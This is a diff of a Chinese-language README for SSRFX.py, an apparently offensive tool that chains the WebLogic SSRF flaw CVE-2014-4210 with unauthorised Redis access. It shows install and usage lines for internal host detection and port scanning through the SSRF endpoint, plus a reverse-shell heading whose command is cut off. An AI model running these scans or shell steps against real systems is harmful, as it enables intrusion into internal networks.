@@ -1,4 +1,10 @@
 # CVE-2014-4210+Redis未授权访问
+
+## 安装
+```
+pip install -r requirements.txt
+```
+## 使用
 ```
 usage: SSRFX.py [-h] [--url URL] [--threads THREADS] [--app APP]
                 [--network NETWORK] [--type TYPE] [--vulapp VULAPP]
@@ -20,15 +26,15 @@ optional arguments:
   --rhost RHOST      remote host ip address
   --rport RPORT      remote host port
 ```  
-# 存活扫描:
+### 存活扫描:
 ```
 python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type livedetect
 ```
-# 端口扫描:
+### 端口扫描:
 ```
 python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan
 ```
-# 反弹shell
+### 反弹shell
 
 > 远程VPS
 ```
